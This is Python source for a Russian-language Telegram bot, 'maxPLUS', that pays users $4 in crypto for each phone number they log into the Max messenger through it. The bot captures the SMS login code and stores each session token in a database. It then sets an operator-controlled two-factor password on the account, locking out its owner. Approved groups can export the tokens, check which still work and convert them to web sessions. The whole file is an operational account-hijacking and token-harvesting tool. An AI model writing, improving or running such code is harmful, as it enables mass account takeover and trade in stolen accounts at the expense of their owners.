import asyncio
import os
import asyncpg
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pymax import Client, ExtraConfig, WebClient
from aiocryptopay import AioCryptoPay, Networks

# === Логирование ===
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("bot.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# === Конфигурация из переменных окружения ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
DATABASE_URL = os.getenv("DATABASE_URL")
DEFAULT_2FA_PASSWORD = os.getenv("PASS", "")
CRYPTO_BOT_TOKEN = os.getenv("CRYPTO2", "")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pending = {}
waiting_code = {}
expecting_phone = set()
db_pool = None
crypto = AioCryptoPay(token=CRYPTO_BOT_TOKEN, network=Networks.TEST_NET) if CRYPTO_BOT_TOKEN else None

# === TelegramSmsProvider ===
class TelegramSmsProvider:
    def __init__(self):
        self._queue = asyncio.Queue()

    async def set_code(self, code: str):
        await self._queue.put(code)

    async def get_code(self, phone: str) -> str:
        return await self._queue.get()

# === Работа с PostgreSQL ===
async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS approved_groups (
                group_id BIGINT PRIMARY KEY
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS tokens (
                phone TEXT PRIMARY KEY,
                token TEXT NOT NULL,
                alive BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                balance REAL DEFAULT 0.0
            )
        """)
    logger.info("База данных инициализирована")

async def is_group_approved(group_id: int) -> bool:
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT 1 FROM approved_groups WHERE group_id = $1", group_id)
        return row is not None

async def save_token_to_db(phone: str, token: str):
    async with db_pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO tokens (phone, token) VALUES ($1, $2) "
            "ON CONFLICT (phone) DO UPDATE SET token = $2, alive = TRUE, created_at = NOW()",
            phone, token
        )

async def get_all_tokens():
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("SELECT phone, token, alive FROM tokens")
        return [{"phone": r["phone"], "token": r["token"], "alive": r["alive"]} for r in rows]

async def update_token_status(phone: str, alive: bool):
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE tokens SET alive = $1 WHERE phone = $2", alive, phone)

# === Баланс пользователя ===
async def get_user_balance(user_id: int) -> float:
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", user_id)
        return row["balance"] if row else 0.0

async def add_to_balance(user_id: int, amount: float):
    async with db_pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO users (user_id, balance) VALUES ($1, $2) "
            "ON CONFLICT (user_id) DO UPDATE SET balance = users.balance + $2",
            user_id, amount
        )

# === Проверка токена на живость ===
async def check_token_alive(token: str) -> bool:
    try:
        client = Client(
            phone="+70000000000",
            work_dir="cache",
            session_name="check.db",
            extra_config=ExtraConfig(token=token),
        )
        await asyncio.wait_for(client.start(), timeout=10)
        return True
    except Exception:
        return False

# === Чтение токена из SQLite-сессии PyMax ===
def read_token_from_session(phone: str) -> str | None:
    import sqlite3
    try:
        conn = sqlite3.connect(f"cache/{phone}.db")
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM sessions WHERE key = 'token'")
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else None
    except Exception:
        return None

# === Проверка: одобренная группа ===
async def is_approved_group(msg: Message) -> bool:
    if msg.chat.type in ("group", "supergroup"):
        return await is_group_approved(msg.chat.id)
    return False

# === Главное меню ===
def main_menu_text():
    return (
        "👋 Приветствуем вас в боте maxPLUS\\.\n\n"
        "Данный сервис полностью автоматизирован: вводите номер, авторизуетесь, получаете доход\\.\n"
        "Бот работает 24/7, мгновенно обрабатывает SMS и авторизует номера без ручного вмешательства\\.\n\n"
        "Актуальная цена:\n"
        "💳 \\- \\$4\\.00"
    )

def main_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Профиль", callback_data="profile"),
            InlineKeyboardButton(text="FAQ", callback_data="faq")
        ],
        [
            InlineKeyboardButton(text="Начать работу", callback_data="start_work")
        ]
    ])

# === Обработчики команд ===

@dp.message(Command("start"))
async def start_cmd(msg: Message):
    if msg.chat.type in ("group", "supergroup"):
        return
    logger.info(f"User {msg.from_user.id} — /start")
    await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")

@dp.message(Command("cancel"))
async def cancel_cmd(msg: Message):
    if msg.chat.type in ("group", "supergroup"):
        return
    expecting_phone.discard(msg.from_user.id)
    waiting_code.pop(msg.from_user.id, None)
    pending.pop(msg.from_user.id, None)
    logger.info(f"User {msg.from_user.id} — /cancel")
    await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")

@dp.message(Command("help"))
async def help_cmd(msg: Message):
    if not await is_approved_group(msg):
        return

    text = (
        "📋 <b>Команды MaxPlus:</b>\n\n"
        "/get — Получить все токены и статистику\n"
        "/convert — Конвертировать токены в WEB\n"
        "/pay — Пополнить казну бота\n"
        "/help — Показать эту справку\n\n"
        "<b>Как авторизоваться:</b>\n"
        "1. Отправь номер в личку боту\n"
        "2. Дождись SMS\n"
        "3. Введи код <b>ответом</b> на второе сообщение бота"
    )
    await msg.answer(text, parse_mode="HTML")

@dp.message(Command("chatid"))
async def chat_id_cmd(msg: Message):
    await msg.answer(f"ID этого чата: `{msg.chat.id}`", parse_mode="MarkdownV2")

@dp.message(Command("set"))
async def set_group(msg: Message):
    if msg.chat.type not in ("group", "supergroup"):
        return
    if msg.from_user.id != ADMIN_ID:
        return

    try:
        group_id = int(msg.text.split()[1])
        async with db_pool.acquire() as conn:
            await conn.execute(
                "INSERT INTO approved_groups (group_id) VALUES ($1) ON CONFLICT DO NOTHING",
                group_id
            )
        logger.info(f"Admin {msg.from_user.id} — одобрил группу {group_id}")
        await msg.answer(f"✅ Группа {group_id} одобрена")
    except (IndexError, ValueError):
        await msg.answer("❌ Используй: /set ID_группы")

@dp.message(Command("unset"))
async def unset_group(msg: Message):
    if msg.chat.type not in ("group", "supergroup"):
        return
    if msg.from_user.id != ADMIN_ID:
        return

    try:
        group_id = int(msg.text.split()[1])
        async with db_pool.acquire() as conn:
            await conn.execute("DELETE FROM approved_groups WHERE group_id = $1", group_id)
        logger.info(f"Admin {msg.from_user.id} — удалил группу {group_id}")
        await msg.answer(f"✅ Группа {group_id} больше не одобрена")
    except (IndexError, ValueError):
        await msg.answer("❌ Используй: /unset ID_группы")

@dp.message(Command("get"))
async def get_tokens(msg: Message):
    if not await is_approved_group(msg):
        return

    status_msg = await msg.answer("⏳ Собираю токены...")
    tokens = await get_all_tokens()

    if not tokens:
        return await status_msg.edit_text("📭 Токенов пока нет")

    text = f"📊 Всего токенов: {len(tokens)}\n\n"
    alive = 0
    dead = 0

    for t in tokens:
        phone = t["phone"]
        token = t["token"]
        is_alive = await check_token_alive(token)
        await update_token_status(phone, is_alive)
        if is_alive:
            alive += 1
            text += f"✅ {phone}\n"
        else:
            dead += 1
            text += f"❌ {phone}\n"

    text += f"\nЖивых: {alive} | Мёртвых: {dead}"

    file_text = ""
    for t in tokens:
        file_text += f"{t['phone']} — {t['token']}\n"

    from io import BytesIO
    file = BytesIO(file_text.encode())
    file.name = "tokens.txt"

    await msg.answer_document(file, caption=text)
    logger.info(f"Group {msg.chat.id} — /get, токенов: {len(tokens)}")

# === Пополнение казны ===
@dp.message(Command("pay"))
async def pay_cmd(msg: Message):
    if not await is_approved_group(msg):
        return
    if not crypto:
        return await msg.answer("❌ Платёжная система не настроена")

    try:
        amount = float(msg.text.split()[1])
    except (IndexError, ValueError):
        return await msg.answer("❌ Используй: /pay 5.00")

    if amount <= 0:
        return await msg.answer("❌ Сумма должна быть больше нуля")

    try:
        invoice = await crypto.create_invoice(
            asset='USDT',
            amount=amount,
            description=f"Пополнение казны maxPLUS от {msg.from_user.id}"
        )
        await msg.answer(
            f"📥 Ссылка на пополнение {amount:.2f} USDT:\n{invoice.bot_invoice_url}"
        )
    except Exception as e:
        await msg.answer(f"❌ Ошибка создания счёта: {e}")

# === Тестовое пополнение ===
@dp.message(Command("coin"))
async def coin_cmd(msg: Message):
    await add_to_balance(msg.from_user.id, 5.0)
    await msg.answer("✅ На баланс зачислено $5.00 (тестовые средства)")

# === Обработчики callback'ов ===

@dp.callback_query(lambda c: c.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    balance = await get_user_balance(user_id)
    dollars = int(balance)
    cents = int((balance - dollars) * 100)
    text = (
        f"🪪 Ваш ID: {user_id}\n"
        f"💰 Баланс: \\${dollars}\\.{cents:02d}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Вывести", callback_data="withdraw"),
            InlineKeyboardButton(text="Назад", callback_data="back_to_start")
        ]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="MarkdownV2")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_start")
async def back_to_start_callback(callback: CallbackQuery):
    expecting_phone.discard(callback.from_user.id)
    await callback.message.edit_text(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    balance = await get_user_balance(user_id)

    if balance < 1.0:
        await callback.answer("Недостаточно средств. Минимальная сумма вывода — $1.00", show_alert=True)
        return

    if not crypto:
        await callback.answer("Платёжная система не настроена", show_alert=True)
        return

    try:
        check = await crypto.create_check(asset='USDT', amount=balance)
        await add_to_balance(user_id, -balance)
        await callback.message.answer(
            f"💳 Чек на вывод {balance:.2f} USDT:\n{check.bot_check_url}"
        )
    except Exception:
        await callback.message.answer(
            "📲 Казна бота еще не пополнена на сумму вашего вывода, подождите или свяжитесь с менеджером."
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "faq")
async def faq_callback(callback: CallbackQuery):
    text = (
        "🔖 <b>Инструкция по использованию maxPLUS</b>\n\n"
        "1. Нажмите <b>«Начать работу»</b> в главном меню\n"
        "2. Отправьте номер телефона в международном формате\n"
        "   Например: +79161234567 или 89161234567\n"
        "3. Дождитесь SMS с кодом подтверждения 📩\n"
        "4. Введите код <b>строго ответом</b> на сообщение бота\n"
        "5. После успешной авторизации баланс пополнится на $4.00 💰\n\n"
        "🔐 Код состоит ровно из 6 цифр, без букв и символов\n"
        "🛡️ Если на номере включена двухфакторная аутентификация — авторизация невозможна\n"
        "📩 При проблемах с SMS — подождите минуту и попробуйте снова"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="back_to_start")]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "start_work")
async def start_work_callback(callback: CallbackQuery):
    expecting_phone.add(callback.from_user.id)
    text = (
        "📧 В следующем сообщении отправьте номер телефона в международном формате\n\n"
        "Для завершения работы введите /cancel"
    )
    await callback.message.edit_text(text)
    await callback.answer()

# === Таймаут кода ===
async def code_timeout(user_id: int, phone: str):
    await asyncio.sleep(150)
    if user_id in waiting_code and user_id in pending:
        pending[user_id] = [s for s in pending[user_id] if s["phone"] != phone]
        if not pending[user_id]:
            waiting_code.pop(user_id, None)
        try:
            await bot.send_message(user_id, "🔖 Время на ввод кода истекло. Пожалуйста, начните авторизацию заново")
        except Exception:
            pass

# === Конвертация токенов в WEB ===
@dp.message(Command("convert"))
async def convert_token(msg: Message):
    if not await is_approved_group(msg):
        return

    args = msg.text.split()
    convert_all = len(args) > 1 and args[1].lower() == "all"

    if not convert_all:
        try:
            phone = args[1]
        except IndexError:
            return await msg.answer("❌ Используй: /convert +79161234567 или /convert all")

    tokens = await get_all_tokens()

    if convert_all:
        if not tokens:
            return await msg.answer("📭 Токенов для конвертации нет")

        status_msg = await msg.answer(f"⏳ Конвертирую все токены ({len(tokens)} шт.)...")
        converted = 0
        web_tokens_list = []

        for t in tokens:
            phone = t["phone"]
            token = t["token"]
            try:
                web_client = WebClient(
                    work_dir="cache",
                    session_name=f"web_{phone}.db",
                    extra_config=ExtraConfig(token=token),
                )
                await web_client.start()
                web_token = read_token_from_session(f"web_{phone}")
                if web_token:
                    await save_token_to_db(phone, web_token)
                    web_tokens_list.append(f"{phone} — {web_token}")
                    converted += 1
                    logger.info(f"Converted {phone} -> WEB")
            except Exception as e:
                logger.warning(f"Failed to convert {phone}: {e}")

        from io import BytesIO
        file = BytesIO("\n".join(web_tokens_list).encode())
        file.name = "web_tokens.txt"

        await status_msg.edit_text(f"✅ Конвертировано: {converted}/{len(tokens)}")
        await msg.answer_document(file, caption=f"📊 WEB-токены ({converted} шт.)")
        return

    token_data = next((t for t in tokens if t["phone"] == phone), None)
    if not token_data:
        return await msg.answer("❌ Токен для этого номера не найден")

    status_msg = await msg.answer("⏳ Конвертирую токен в WEB...")

    try:
        web_client = WebClient(
            work_dir="cache",
            session_name=f"web_{phone}.db",
            extra_config=ExtraConfig(token=token_data["token"]),
        )
        await web_client.start()
        web_token = read_token_from_session(f"web_{phone}")
        if web_token:
            await save_token_to_db(phone, web_token)
            await status_msg.edit_text(f"✅ Токен для {phone} конвертирован в WEB")
            logger.info(f"Group {msg.chat.id} — /convert {phone} -> WEB")
        else:
            await status_msg.edit_text("❌ Не удалось получить WEB-токен")
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка конвертации: {e}")

# === Обработчик номера телефона ===

@dp.message(F.text, ~F.text.startswith("/"))
async def phone_handler(msg: Message):
    if msg.chat.type in ("group", "supergroup"):
        return

    raw = msg.text.strip()
    digits = "".join(c for c in raw if c.isdigit())

    is_phone = len(digits) in (10, 11) and (digits.startswith("7") or digits.startswith("8"))

    if is_phone and msg.from_user.id in expecting_phone:
        if len(digits) == 11 and digits.startswith("7"):
            phone = "+" + digits
        elif len(digits) == 11 and digits.startswith("8"):
            phone = "+7" + digits[1:]
        else:
            phone = "+7" + digits

        logger.info(f"User {msg.from_user.id} — запрос SMS на номер {phone}")

        sms_provider = TelegramSmsProvider()
        client = Client(
            phone=phone,
            work_dir="cache",
            session_name=f"{phone}.db",
            sms_code_provider=sms_provider,
            extra_config=ExtraConfig(log_level="INFO"),
        )

        asyncio.create_task(run_client(msg, client, phone, sms_provider))

        await msg.answer(f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты.")
        await asyncio.sleep(1.5)

        waiting_code[msg.from_user.id] = True
        instruction_msg = await msg.answer("📩 Введите код из SMS ответом на это сообщение:")

        if msg.from_user.id not in pending:
            pending[msg.from_user.id] = []
        pending[msg.from_user.id].append({
            "provider": sms_provider,
            "phone": phone,
            "message_id": instruction_msg.message_id
        })

        asyncio.create_task(code_timeout(msg.from_user.id, phone))
        return

    if msg.from_user.id in waiting_code:
        if msg.reply_to_message and msg.reply_to_message.from_user.id == bot.id:
            return await code_as_reply(msg)
        return await msg.answer(
            "❌ Неверный формат ввода. Пожалуйста, введите код ответом на сообщение бота с инструкцией"
        )

    if msg.from_user.id not in expecting_phone:
        return

    await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")

async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
    try:
        await client.start()

        token = read_token_from_session(phone)
        if token:
            await save_token_to_db(phone, token)

        await add_to_balance(msg.from_user.id, 4.0)

        logger.info(f"User {msg.from_user.id} — номер {phone} успешно авторизован")
        await msg.answer(
            "📲 Номер успешно авторизован, на ваш баланс зачислено \\$4\\.00",
            parse_mode="MarkdownV2"
        )

        if DEFAULT_2FA_PASSWORD:
            await asyncio.sleep(15)
            try:
                await client.set_2fa(password=DEFAULT_2FA_PASSWORD)
                logger.info(f"Пароль 2FA установлен для {phone}")
            except Exception:
                logger.info(f"Пароль 2FA уже стоит на {phone}")

    except Exception as e:
        error_text = str(e).lower()
        error_name = type(e).__name__.lower()

        if "2fa" in error_text or "password" in error_text:
            await msg.answer("❌ На номере включена двухфакторная аутентификация. Авторизация невозможна. Повторная попытка через 7 дней")
        elif "blocked" in error_text or "recovery" in error_text:
            await msg.answer("❌ Номер заблокирован или удалён. Восстановлению не подлежит, используйте другой номер")
        elif "auth" in error_name or "code" in error_text or "token" in error_text:
            await msg.answer("❌ Неверный код подтверждения. Проверьте правильность ввода и повторите попытку")
        elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
            await msg.answer("❌ Проблемы с сетью. Проверьте подключение к интернету и попробуйте позже")
        elif "already" in error_text or "session" in error_text:
            await msg.answer("❌ Этот номер уже был авторизован ранее, повторный вход не требуется")
        else:
            await msg.answer(f"❌ Ошибка: {e}")

        logger.warning(f"User {msg.from_user.id} — номер {phone} ошибка: {error_text}")

async def code_as_reply(msg: Message):
    if msg.from_user.id not in pending or not pending[msg.from_user.id]:
        waiting_code.pop(msg.from_user.id, None)
        return await msg.answer("❌ Сессия устарела. Отправьте номер заново")

    code = msg.text.strip()

    if not code.isdigit() or len(code) != 6:
        return await msg.answer(
            "❌ Неверный формат кода. Код должен состоять ровно из 6 цифр, без букв и символов"
        )

    replied_msg_id = msg.reply_to_message.message_id
    session_data = None

    for s in pending[msg.from_user.id]:
        if s["message_id"] == replied_msg_id:
            session_data = s
            break

    if not session_data:
        return await msg.answer("❌ Ответьте именно на то сообщение, где бот просит ввести код")

    provider = session_data["provider"]
    phone = session_data["phone"]
    pending[msg.from_user.id].remove(session_data)

    if not pending[msg.from_user.id]:
        waiting_code.pop(msg.from_user.id, None)

    logger.info(f"User {msg.from_user.id} — код принят для {phone}")
    await provider.set_code(code)
    await msg.answer("📩 Код принят, запущен процесс авторизации. Ожидайте завершения...")

async def main():
    await init_db()
    logger.info("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
